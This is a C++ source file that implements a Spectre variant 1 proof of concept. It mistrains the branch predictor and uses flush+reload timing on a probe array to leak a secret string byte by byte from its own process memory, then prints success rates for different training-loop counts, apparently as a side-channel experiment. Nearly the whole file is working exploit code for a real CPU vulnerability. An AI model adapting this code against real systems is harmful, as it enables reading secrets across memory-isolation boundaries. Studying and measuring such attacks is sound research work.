#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <memory.h>
#include <random>
#include "utils.hpp"

#define FROM ' '
#define TO 'Z'

const int MAX_TRAINING_LOOPS = 4096;
const int INBETWEEN_DELAY = 0;
bool IS_ATTACK[MAX_TRAINING_LOOPS];
double results[MAX_TRAINING_LOOPS] = {0};

int training_loops = 5;
char __attribute__((aligned(2048))) mem_side_channel[256 * 2048];
uint8_t arr[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18};
uint8_t hist[256];

uint8_t arr_size = sizeof(arr) / sizeof(uint8_t);
char secret[] = "AD ASTRA ABYSSOSQUE";

using namespace x86_64;

void side_channel_check()
{
    for (size_t i = FROM; i <= TO; i++)
    {
        if (asm_utils::flush_reload((char *)mem_side_channel + 2048 * i))
        {
            hist[i]++;
        }
    }
}

bool is_prime(int a)
{
    if (a < 2)
        return 0;
    for (int i = 2; i * i <= a; ++i)
        if (a % i == 0)
            return false;
    return true;
}

// #define LOOP
#define PRIME
void init(int mode = 0)
{
    switch (mode)
    {
    case 0:
        for (int i = 0; i < training_loops; i++)
        {
            if (i % 8 == 0)
            {
                IS_ATTACK[i] = true;
            }
        }
        break;
    case 1:
        for (int i = 0; i < training_loops; i++)
        {
            if (is_prime(i))
            {
                IS_ATTACK[i] = true;
            }
            else
            {
                IS_ATTACK[i] = false;
            }
        }
    case 2:
        for (int i = 0; i < training_loops; i++)
        {
            if ((double)random() / RAND_MAX > 0.5)
            {
                IS_ATTACK[i] = true;
            }
            else
            {
                IS_ATTACK[i] = false;
            }
        }
    default:
        break;
    }
    printf("Mistrain(0) and Attack(1) Mark: \n");
    for (int i = 0; i < training_loops; i++)
    {
        printf("%d ", IS_ATTACK[i]);
    }
    printf("\n\n");
}

uint8_t spectre(size_t locate)
{
    // return mem_side_channel[arr[locate] * 2048];
    if (locate < arr_size)
    {
        return mem_side_channel[arr[locate] * 2048];
    }
    return 0;
}

void attack(size_t target)
{
    size_t train_idx, idx;
    int i, j;
    for (size_t i = 0; i < 256; i++)
    {
        asm_utils::flush(&mem_side_channel[i * 2048]);
    }
    for (i = training_loops - 1; i >= 0; i--)
    {
        train_idx = i % arr_size;
        asm_utils::flush(&arr_size);
        asm_utils::mfence();

        // training branch predict
        for (j = training_loops - 1; j >= 0; j--)
        {
            idx = IS_ATTACK[j] * target + (!IS_ATTACK[j]) * train_idx;
            spectre(idx);
            // printf("idx %ld\n", idx);
            // uint8_t result = spectre(idx);
            // printf("result: %c\n", result);
        }

        spectre(target);

        // fake spectre
        // char tc = mem_side_channel[arr[target] * 2048];
        // printf("%c\n", arr[target]);

        side_channel_check();
    }
}

size_t get_side_channel_info()
{
    // printf("  ");
    // for (size_t i = FROM; i <= TO; i++)
    // {
    //     printf("%3c ", (char)i);
    // }
    // printf("\n  ");
    uint8_t max = 0, argmax = FROM, all = 0;
    for (size_t i = FROM; i <= TO; i++)
    {
        // printf("%3ld ", i);
        argmax = max > hist[i] ? argmax : i;
        max = max > hist[i] ? max : hist[i];
        all += hist[i];
    }
    // printf("\n%% ");
    // for (size_t i = FROM; i <= TO; i++)
    // {
    //     printf("%3.0f ", (double)hist[i] / ((double)all + 1e-8) * 100);
    // }
    // printf("\nargmax: %c\n", argmax);
    return argmax;
}

size_t run(size_t locate)
{
    memset(hist, 0, sizeof(hist));
    for (size_t i = 0; i < sizeof(mem_side_channel) / 2048; i++)
    {
        for (size_t j = 0; j < 2048; j++)
        {
            mem_side_channel[i * 2048 + j] = i;
        }
    }
    size_t times = 10;
    for (size_t i = 0; i < times; i++)
    {
        attack(locate);
    }
    size_t result = get_side_channel_info();
    return result;
}

int main(int argc, char **argv)
{
    int max_loop = 50, mode = 2;
    for (size_t j = 0; j < max_loop; j++)
    {
        training_loops = j;
        init(mode);
        size_t target_base = (size_t)(&secret) - (size_t)(&arr);

        size_t leak[arr_size + 1], len = sizeof(secret) / sizeof(char), success = 0;
        for (size_t i = 0; i < len - 1; i++)
        {
            size_t result = run(target_base + i);
            leak[i] = result;
            // printf("gt: %c, success: %s \n",
            //        secret[i], secret[i] == (char)result ? "ture" : "false");
            success += secret[i] == (char)result;
        }
        for (size_t i = 0; i < len - 1; i++)
        {
            printf("%c", (char)leak[i]);
        }
        double rate = (double)success / (len - 1) * 100;
        results[j] = rate;
        printf(", success rate: %.3lf%%\n", rate);
    }
    // print result as json string
    printf("{");
    for (size_t i = 0; i < max_loop; i++)
    {
        printf("\"%ld\": %.3lf", i, results[i]);
        if (i != max_loop - 1)
        {
            printf(", ");
        }
    }
    printf("}\n");
    return 0;
}
